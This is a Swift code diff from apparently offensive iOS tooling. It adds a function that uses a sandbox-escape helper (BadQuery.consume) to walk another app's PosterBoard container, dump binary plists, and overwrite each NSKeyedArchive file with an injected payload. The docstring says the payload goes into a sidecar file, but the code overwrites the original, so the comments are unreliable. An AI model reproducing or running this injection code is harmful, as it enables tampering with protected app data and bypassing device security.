@@ -1123,11 +1123,16 @@ class SymHandler {
             let fullContainer = BadQuery.applicationContainerPath(appHash: uuid)
             let dataStoreBase = fullContainer + "/Library/Application Support/PRBPosterExtensionDataStore"
             diag.append("  container: \(fullContainer)")
-            pbEnumDir(dataStoreBase, depth: 0, maxDepth: 5, fm: fm, diag: &diag)
+            // Depth 7: goes into descriptor/configuration UUID leaf dirs
+            pbEnumDir(dataStoreBase, depth: 0, maxDepth: 7, fm: fm, diag: &diag)
 
             // Find all SQLite files anywhere under the container
             diag.append("  --- SQLite files in container ---")
             pbFindAndProbeSQLite(under: fullContainer, fm: fm, payload: payload, diag: &diag)
+
+            // Find ALL bplist/NSKeyedArchive files (any extension)
+            diag.append("  --- bplist files in container ---")
+            pbFindBplists(under: fullContainer, fm: fm, payload: payload, diag: &diag)
         }
 
         // [2] App group containers — posterboard-related identifiers
@@ -1224,6 +1229,68 @@ class SymHandler {
                 pbFindAndProbeSQLite(under: sub, fm: fm, payload: payload, diag: &diag)
             } else if item.hasSuffix(".sqlite") || item.hasSuffix(".sqlite3") || item.hasSuffix(".db") {
                 pbProbeSQLite(path: sub, payload: payload, fm: fm, diag: &diag)
+            }
+        }
+    }
+
+    /// Walk the tree and report every file whose first 8 bytes are bplist00.
+    /// For each found file: print path, size, first 256 bytes as hex + ASCII.
+    /// If it's an NSKeyedArchive and we can open it, inject our payload in a sidecar
+    /// file (same path + ".injected") so the caller can manually replace if needed.
+    private static func pbFindBplists(under base: String, fm: FileManager,
+                                       payload: Data, diag: inout [String]) {
+        guard let h = try? BadQuery.consume(path: base, create: true) else { return }
+        defer { h.release() }
+        guard let items = try? fm.contentsOfDirectory(atPath: base) else { return }
+        for item in items where !item.hasPrefix(".") {
+            let sub = "\(base)/\(item)"
+            var isDir: ObjCBool = false
+            fm.fileExists(atPath: sub, isDirectory: &isDir)
+            if isDir.boolValue {
+                pbFindBplists(under: sub, fm: fm, payload: payload, diag: &diag)
+            } else {
+                // Only read non-SQLite files we haven't already reported
+                guard !item.hasSuffix(".sqlite") && !item.hasSuffix(".sqlite3") &&
+                      !item.hasSuffix(".db") && !item.hasSuffix("-wal") &&
+                      !item.hasSuffix("-shm") else { continue }
+                guard let fh = try? BadQuery.consume(path: sub, create: true) else { continue }
+                defer { fh.release() }
+                guard let data = fm.contents(atPath: sub), data.count >= 8 else { continue }
+                let magic = data.prefix(8)
+                let magicStr = String(data: magic, encoding: .ascii) ?? ""
+                guard magicStr.hasPrefix("bplist") else { continue }
+
+                let isKeyedArchive = magicStr.hasPrefix("bplist00")
+                let tag = isKeyedArchive ? "[NSKEYED]" : "[BPLIST-OTHER]"
+                diag.append("  \(tag) \(sub) (\(data.count)b)")
+
+                // Hex dump first 64 bytes
+                let dump = data.prefix(64).map { String(format: "%02x", $0) }.joined(separator: " ")
+                diag.append("    hex: \(dump)")
+
+                // Try to deserialize as plist for class hints
+                if let pl = try? PropertyListSerialization.propertyList(from: data, options: [], format: nil) {
+                    let desc = String(describing: pl)
+                    diag.append("    plist: \(desc.prefix(400))")
+                }
+
+                // If it's an NSKeyedArchive, try to inject by replacing the file
+                if isKeyedArchive {
+                    // Write payload to file directly (overwrite)
+                    let writeable = (data.count > 0)
+                    if writeable, fm.isWritableFile(atPath: sub) {
+                        let writeRc = (payload as NSData).write(toFile: sub, atomically: true)
+                        diag.append("    inject: \(writeRc ? "WRITE OK ✓" : "WRITE FAIL")")
+                    } else {
+                        // Try via FileManager
+                        do {
+                            try payload.write(to: URL(fileURLWithPath: sub), options: .atomic)
+                            diag.append("    inject: WRITE OK (FileManager) ✓")
+                        } catch {
+                            diag.append("    inject: WRITE FAIL \(error.localizedDescription)")
+                        }
+                    }
+                }
             }
         }
     }
